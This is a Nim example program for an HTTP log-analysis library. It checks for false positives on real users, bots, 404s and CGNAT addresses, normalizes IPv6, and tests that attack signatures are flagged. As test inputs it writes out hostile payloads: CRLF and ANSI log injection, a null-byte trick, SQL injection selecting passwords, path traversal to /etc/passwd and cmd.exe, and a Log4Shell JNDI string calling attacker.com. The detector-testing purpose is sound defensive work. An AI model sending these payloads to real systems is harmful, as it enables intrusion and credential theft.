# Example: Threat Detection Accuracy & False Positive Auditing
# Demonstrates Phase 08 / Category C:
# - Item 01: Audit detection rules against legitimate web traffic (real users, search bots)
# - Item 02: Verify accidental 404s and broken links do not trigger false positive hacker classifications
# - Item 03: Verify multi-IP correlation does not merge distinct innocent users behind CGNAT or proxy IPs
# - Item 04: Test edge cases in IPv6 parsing and RFC 5952 address normalization
# - Item 05: Test resilience against adversarial log injection (ANSI escapes, CRLF, null bytes)
# - Item 06: Verify case-insensitive and normalized attack signature evaluation
#
# Compile and run with:
#   nim r --path:src examples/threat_accuracy_and_false_positives.nim

import std/[strutils, times, options]
import http_logviewer
import http_logviewer/core/types
import http_logviewer/enrichment/bogon
import http_logviewer/analyzer/correlator
import http_logviewer/parser/formats

proc main() =
  echo "=== http_logviewer: Threat Detection Accuracy & False Positive Auditing (Phase 08 / Category C) ==="
  echo ""

  # 1. Legitimate Web Traffic & Verified Bot Protection (Item 01)
  echo "[1] Legitimate Web Traffic & Search Engine Bot Auditing:"
  let realUserEntry = initHttpLogEntry(
    clientIp = "93.184.216.34",
    timestamp = now(),
    `method` = HttpGet,
    path = "/products?category=electronics&sort=asc&page=2",
    statusCode = 200,
    bytesSent = 4096,
    referer = "https://example.com/catalog",
    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"
  )
  let realThreat = analyzeEntry(realUserEntry)
  echo "  Real User Request:      ", realUserEntry.path
  echo "  Assigned Category:      ", realThreat.category, " (Risk Score: ", realThreat.score, "/100)"

  let googlebotEntry = initHttpLogEntry(
    clientIp = "66.249.66.1",
    timestamp = now(),
    `method` = HttpGet,
    path = "/articles/deep-learning-systems",
    statusCode = 200,
    bytesSent = 15200,
    userAgent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
  )
  let botThreat = analyzeEntry(googlebotEntry)
  echo "  Googlebot Crawler:      ", googlebotEntry.path
  echo "  Assigned Category:      ", botThreat.category, " (Risk Score: ", botThreat.score, "/100, Rule: ", botThreat.matchedSignatures[0], ")"
  echo ""

  # 2. Accidental 404 & Broken Link Protection (Item 02)
  echo "[2] Accidental 404 & Broken Link Protection:"
  let brokenLinkEntry = initHttpLogEntry(
    clientIp = "203.0.113.15",
    timestamp = now(),
    `method` = HttpGet,
    path = "/blog/missing-old-post-2018",
    statusCode = 404,
    bytesSent = 162,
    referer = "https://example.com/blog",
    userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36"
  )
  let brokenThreat = analyzeEntry(brokenLinkEntry)
  echo "  Broken Page Link (404): ", brokenLinkEntry.path
  echo "  Classification:         ", brokenThreat.category, " (Score: ", brokenThreat.score, "/100 - Protected from Hacker flag)"

  let missingAssetEntry = initHttpLogEntry(
    clientIp = "203.0.113.16",
    timestamp = now(),
    `method` = HttpGet,
    path = "/images/old-logo.png",
    statusCode = 404,
    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  )
  let assetThreat = analyzeEntry(missingAssetEntry)
  echo "  Missing Asset (404):    ", missingAssetEntry.path
  echo "  Classification:         ", assetThreat.category, " (Score: ", assetThreat.score, "/100 - Zero false positive penalty)"
  echo ""

  # 3. Multi-IP Correlation & CGNAT / Proxy Protection (Item 03)
  echo "[3] Multi-IP Correlation & CGNAT / Corporate Proxy Protection:"
  let clusterTable = newActorClusterTable(windowSeconds = 300)
  let cgnatIp = "100.64.1.55"
  let t = now()

  let userA = initHttpLogEntry(
    clientIp = cgnatIp,
    timestamp = t,
    `method` = HttpGet,
    path = "/home",
    statusCode = 200,
    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"
  )
  let userB = initHttpLogEntry(
    clientIp = cgnatIp,
    timestamp = t + initDuration(seconds = 5),
    `method` = HttpGet,
    path = "/docs/faq",
    statusCode = 200,
    userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Safari/604.1"
  )
  let cA = clusterTable.correlateRecord(userA, analyzeEntry(userA))
  let cB = clusterTable.correlateRecord(userB, analyzeEntry(userB))
  echo "  CGNAT Shared IP:        ", cgnatIp, " (RFC 6598 100.64.0.0/10)"
  echo "  User A Clustered:       ", cA.isSome, " (Skipped: Innocent RealUser)"
  echo "  User B Clustered:       ", cB.isSome, " (Skipped: Innocent RealUser)"
  echo "  Active Clusters:        ", clusterTable.len, " (Zero false positive cluster merges)"
  echo ""

  # 4. IPv6 Parsing Edge Cases & RFC 5952 Normalization (Item 04)
  echo "[4] IPv6 Parsing Edge Cases & RFC 5952 Canonical Normalization:"
  let rawV6List = [
    "2001:0db8:0000:0000:0000:ff00:0042:8329",
    "0:0:0:0:0:0:0:1",
    "2001:db8:0:0:1:0:0:1",
    "2001:db8:0:1:1:1:1:1",
    "[2001:db8::1]:8080",
    "[fe80::1%eth0]:80",
    "::ffff:192.0.2.128"
  ]
  for raw in rawV6List:
    let norm = normalizeIpAddress(raw)
    echo "  Raw Input:  ", alignLeft(raw, 42), " -> Canonical: ", norm
  echo ""

  # 5. Adversarial Log Injection Resilience (Item 05)
  echo "[5] Adversarial Log Injection Resilience:"
  let maliciousUa = "Mozilla/5.0 \x1b[2J\x1b[H\x1b[31;1mPWNED\x1b[0m"
  let sanitizedUa = sanitizeField(maliciousUa)
  echo "  Adversarial User-Agent: ", sanitizedUa, " (Raw \\x1b byte stripped; converted to literal \\e)"

  let crlfUri = "/index.html\r\nHost: evil.com\r\n\r\n"
  let safeUri = sanitizeField(crlfUri)
  echo "  CRLF Header Injection:  ", safeUri, " (Newlines escaped to \\r\\n; prevents log splitting)"

  let nullByteUri = "/download/report.pdf\0.php"
  let safeNull = sanitizeField(nullByteUri)
  echo "  Null-Byte Injection:    ", safeNull, " (Null byte escaped to \\0; prevents C string truncation)"
  echo ""

  # 6. Case-Insensitive & Normalized Attack Signatures (Item 06)
  echo "[6] Case-Insensitive & Normalized Attack Signatures:"
  let attackUris = [
    "/.ENV",
    "/Wp-LoGiN.PhP",
    "/items?id=1+UnIoN+SeLeCt+null,password+from+users",
    "..\\..\\WiNdOwS\\sYsTeM32\\cmd.exe",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "${jNdI:LdAp://attacker.com/exploit}"
  ]
  for uri in attackUris:
    let threat = analyzeEntry(initHttpLogEntry(path = uri))
    let flagsStr = $threat.flags
    echo "  URI: ", alignLeft(uri, 50), " -> Score: ", threat.score, " ", threat.category, " ", flagsStr
  echo ""
  echo "=== All Threat Detection Accuracy & False Positive Audits Completed Successfully ==="

when isMainModule:
  main()
